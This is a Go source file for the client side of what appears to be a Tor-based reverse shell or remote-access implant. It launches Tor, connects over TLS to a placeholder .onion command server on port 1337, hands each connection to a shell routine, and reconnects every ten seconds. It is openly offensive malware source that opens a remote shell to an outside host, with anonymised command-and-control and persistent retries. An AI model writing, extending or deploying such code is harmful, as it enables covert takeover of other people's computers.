package client

import (
	"crypto/tls"
	"crypto/x509"
	"log"
	"net"
	"time"

	"github.com/cretz/bine/tor"
)

const (
	// serverDomain needs to be changed to your address
	serverDomain = "youronionadresshere.onion"
	serverPort   = ":1337"
	serverAddr   = serverDomain + serverPort
)

// serverCert needs to be changed to the TLS certificate of the server
// intendation breaks the certificate
const serverCert = `-----BEGIN CERTIFICATE-----
____ CERTIFICATE GOES HERE | DONT INDENT ____
-----END CERTIFICATE-----`

type connection struct {
	Conn    net.Conn
	Sysinfo string
}

func connect(dialer *tor.Dialer) (net.Conn, error) {
	conn, err := dialer.Dial("tcp", serverAddr)
	if err != nil {
		return nil, err
	}
	log.Println("connect")
	caPool := x509.NewCertPool()
	caPool.AppendCertsFromPEM([]byte(serverCert))

	config := tls.Config{RootCAs: caPool, ServerName: serverDomain}
	tlsconn := tls.Client(conn, &config)
	if err != nil {
		return nil, err
	}
	return tlsconn, nil
}

func NetClient() {
	log.Println("NetClient")
	conf := tor.StartConf{ExePath: TorExe, ControlPort: 9051, DataDir: TorData, NoAutoSocksPort: true}
	t, err := tor.Start(nil, &conf)
	if err != nil {
		log.Println("[!] Tor could not be started:", err)
		return
	}
	defer t.Close()
	dialer, _ := t.Dialer(nil, nil)
	for {
		conn, err := connect(dialer)
		if err != nil {
			log.Println("Could not connect:", err)
			time.Sleep(10 * time.Second)
			continue
		}
		c := new(connection)
		c.Conn = conn
		c.shell()
		time.Sleep(10 * time.Second)
	}
}
